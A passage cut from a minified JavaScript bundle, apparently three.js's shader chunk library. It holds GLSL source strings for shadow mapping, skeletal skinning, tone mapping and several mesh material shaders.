shadowCoord.xyz;\n\t\tfloat dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear );\t\tdp += shadowBias;\n\t\tvec3 bd3D = normalize( lightToPosition );\n\t\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT ) || defined( SHADOWMAP_TYPE_VSM )\n\t\t\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\n\t\t\treturn (\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#else\n\t\t\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\n\t\t#endif\n\t}\n#endif",shadowmap_pars_vertex:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n#endif",shadowmap_vertex:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\n\t}\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\n\t}\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\n\t}\n\t#endif\n#endif",shadowmask_pars_fragment:"float getShadowMask() {\n\tfloat shadow = 1.0;\n\t#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\tDirectionalLight directionalLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tdirectionalLight = directionalLights[ i ];\n\t\tshadow *= all( bvec2( directionalLight.shadow, receiveShadow ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t}\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\tSpotLight spotLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tspotLight = spotLights[ i ];\n\t\tshadow *= all( bvec2( spotLight.shadow, receiveShadow ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t}\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\tPointLight pointLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tpointLight = pointLights[ i ];\n\t\tshadow *= all( bvec2( pointLight.shadow, receiveShadow ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\t}\n\t#endif\n\t#endif\n\treturn shadow;\n}",skinbase_vertex:"#ifdef USE_SKINNING\n\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\n\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\n\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\n\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\n#endif",skinning_pars_vertex:"#ifdef USE_SKINNING\n\tuniform mat4 bindMatrix;\n\tuniform mat4 bindMatrixInverse;\n\t#ifdef BONE_TEXTURE\n\t\tuniform highp sampler2D boneTexture;\n\t\tuniform int boneTextureSize;\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tfloat j = i * 4.0;\n\t\t\tfloat x = mod( j, float( boneTextureSize ) );\n\t\t\tfloat y = floor( j / float( boneTextureSize ) );\n\t\t\tfloat dx = 1.0 / float( boneTextureSize );\n\t\t\tfloat dy = 1.0 / float( boneTextureSize );\n\t\t\ty = dy * ( y + 0.5 );\n\t\t\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\n\t\t\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\n\t\t\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\n\t\t\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\n\t\t\tmat4 bone = mat4( v1, v2, v3, v4 );\n\t\t\treturn bone;\n\t\t}\n\t#else\n\t\tuniform mat4 boneMatrices[ MAX_BONES ];\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tmat4 bone = boneMatrices[ int(i) ];\n\t\t\treturn bone;\n\t\t}\n\t#endif\n#endif",skinning_vertex:"#ifdef USE_SKINNING\n\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\n\tvec4 skinned = vec4( 0.0 );\n\tskinned += boneMatX * skinVertex * skinWeight.x;\n\tskinned += boneMatY * skinVertex * skinWeight.y;\n\tskinned += boneMatZ * skinVertex * skinWeight.z;\n\tskinned += boneMatW * skinVertex * skinWeight.w;\n\ttransformed = ( bindMatrixInverse * skinned ).xyz;\n#endif",skinnormal_vertex:"#ifdef USE_SKINNING\n\tmat4 skinMatrix = mat4( 0.0 );\n\tskinMatrix += skinWeight.x * boneMatX;\n\tskinMatrix += skinWeight.y * boneMatY;\n\tskinMatrix += skinWeight.z * boneMatZ;\n\tskinMatrix += skinWeight.w * boneMatW;\n\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\n\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\n\t#ifdef USE_TANGENT\n\t\tobjectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\t#endif\n#endif",specularmap_fragment:"float specularStrength;\n#ifdef USE_SPECULARMAP\n\tvec4 texelSpecular = texture2D( specularMap, vUv );\n\tspecularStrength = texelSpecular.r;\n#else\n\tspecularStrength = 1.0;\n#endif",specularmap_pars_fragment:"#ifdef USE_SPECULARMAP\n\tuniform sampler2D specularMap;\n#endif",tonemapping_fragment:"#if defined( TONE_MAPPING )\n\tgl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\n#endif",tonemapping_pars_fragment:"#ifndef saturate\n#define saturate(a) clamp( a, 0.0, 1.0 )\n#endif\nuniform float toneMappingExposure;\nuniform float toneMappingWhitePoint;\nvec3 LinearToneMapping( vec3 color ) {\n\treturn toneMappingExposure * color;\n}\nvec3 ReinhardToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( color / ( vec3( 1.0 ) + color ) );\n}\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\nvec3 Uncharted2ToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\n}\nvec3 OptimizedCineonToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\tcolor = max( vec3( 0.0 ), color - 0.004 );\n\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\n}\nvec3 ACESFilmicToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( ( color * ( 2.51 * color + 0.03 ) ) / ( color * ( 2.43 * color + 0.59 ) + 0.14 ) );\n}",uv_pars_fragment:"#ifdef USE_UV\n\tvarying vec2 vUv;\n#endif",uv_pars_vertex:"#ifdef USE_UV\n\tvarying vec2 vUv;\n\tuniform mat3 uvTransform;\n#endif",uv_vertex:"#ifdef USE_UV\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n#endif",uv2_pars_fragment:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvarying vec2 vUv2;\n#endif",uv2_pars_vertex:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tattribute vec2 uv2;\n\tvarying vec2 vUv2;\n#endif",uv2_vertex:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvUv2 = uv2;\n#endif",worldpos_vertex:"#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP )\n\tvec4 worldPosition = vec4( transformed, 1.0 );\n\t#ifdef USE_INSTANCING\n\t\tworldPosition = instanceMatrix * worldPosition;\n\t#endif\n\tworldPosition = modelMatrix * worldPosition;\n#endif",background_frag:"uniform sampler2D t2D;\nvarying vec2 vUv;\nvoid main() {\n\tvec4 texColor = texture2D( t2D, vUv );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",background_vert:"varying vec2 vUv;\nuniform mat3 uvTransform;\nvoid main() {\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n\tgl_Position = vec4( position.xy, 1.0, 1.0 );\n}",cube_frag:"uniform samplerCube tCube;\nuniform float tFlip;\nuniform float opacity;\nvarying vec3 vWorldDirection;\nvoid main() {\n\tvec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\tgl_FragColor.a *= opacity;\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",cube_vert:"varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\tgl_Position.z = gl_Position.w;\n}",depth_frag:"#if DEPTH_PACKING == 3200\n\tuniform float opacity;\n#endif\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#if DEPTH_PACKING == 3200\n\t\tdiffuseColor.a = opacity;\n\t#endif\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <logdepthbuf_fragment>\n\t#if DEPTH_PACKING == 3200\n\t\tgl_FragColor = vec4( vec3( 1.0 - gl_FragCoord.z ), opacity );\n\t#elif DEPTH_PACKING == 3201\n\t\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\n\t#endif\n}",depth_vert:"#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n}",distanceRGBA_frag:"#define DISTANCE\nuniform vec3 referencePosition;\nuniform float nearDistance;\nuniform float farDistance;\nvarying vec3 vWorldPosition;\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main () {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\tfloat dist = length( vWorldPosition - referencePosition );\n\tdist = ( dist - nearDistance ) / ( farDistance - nearDistance );\n\tdist = saturate( dist );\n\tgl_FragColor = packDepthToRGBA( dist );\n}",distanceRGBA_vert:"#define DISTANCE\nvarying vec3 vWorldPosition;\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\tvWorldPosition = worldPosition.xyz;\n}",equirect_frag:"uniform sampler2D tEquirect;\nvarying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvec3 direction = normalize( vWorldDirection );\n\tvec2 sampleUV;\n\tsampleUV.y = asin( clamp( direction.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\n\tvec4 texColor = texture2D( tEquirect, sampleUV );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",equirect_vert:"varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n}",linedashed_frag:"uniform vec3 diffuse;\nuniform float opacity;\nuniform float dashSize;\nuniform float totalSize;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\n\t\tdiscard;\n\t}\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <color_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",linedashed_vert:"uniform float scale;\nattribute float lineDistance;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <color_vertex>\n\tvLineDistance = scale * lineDistance;\n\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\n\tgl_Position = projectionMatrix * mvPosition;\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}",meshbasic_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\t#ifdef USE_LIGHTMAP\n\t\treflectedLight.indirectDiffuse += texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\n\t#else\n\t\treflectedLight.indirectDiffuse += vec3( 1.0 );\n\t#endif\n\t#include <aomap_fragment>\n\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\n\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",meshbasic_vert:"#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_ENVMAP\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <envmap_vertex>\n\t#include <fog_vertex>\n}",meshlambert_frag:"uniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <fog_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <emissivemap_fragment>\n\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.indirectDiffuse += ( gl_FrontFacing ) ? vIndirectFront : vIndirectBack;\n\t#else\n\t\treflectedLight.indirectDiffuse += vIndirectFront;\n\t#endif\n\t#include <lightmap_fragment>\n\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\n\t#else\n\t\treflectedLight.directDiffuse = vLightFront;\n\t#endif\n\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshlambert_vert:"#define LAMBERT\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <lights_lambert_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshmatcap_frag:"#define MATCAP\nuniform vec3 diffuse;\nuniform float opacity;\nuniform sampler2D matcap;\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tvec3 viewDir = normalize( vViewPosition );\n\tvec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );\n\tvec3 y = cross( viewDir, x );\n\tvec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;\n\t#ifdef USE_MATCAP\n\t\tvec4 matcapColor = texture2D( matcap, uv );\n\t\tmatcapColor = matcapTexelToLinear( matcapColor );\n\t#else\n\t\tvec4 matcapColor = vec4( 1.0 );\n\t#endif\n\tvec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",meshmatcap_vert:"#define MATCAP\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#ifndef FLAT_SHADED\n\t\tvNormal = normalize( transformedNormal );\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n\tvViewPosition = - mvPosition.xyz;\n}",meshphong_frag:"#define PHONG\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform vec3 specular;\nuniform float shininess;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <gradientmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <lights_phong_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_phong_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshphong_vert:"#define PHONG\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshphysical_frag:"#define STANDARD\n#ifdef PHYSICAL\n\t#define REFLECTIVITY\n\t#define CLEARCOAT\n\t#define TRANSPARENCY\n#endif\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float roughness;\nuniform float metalness;\nuniform float opacity;\n#ifdef TRANSPARENCY\n\tuniform float transparency;\n#endif\n#ifdef REFLECTIVITY\n\tuniform float reflectivity;\n#endif\n#ifdef CLEARCOAT\n\tuniform float 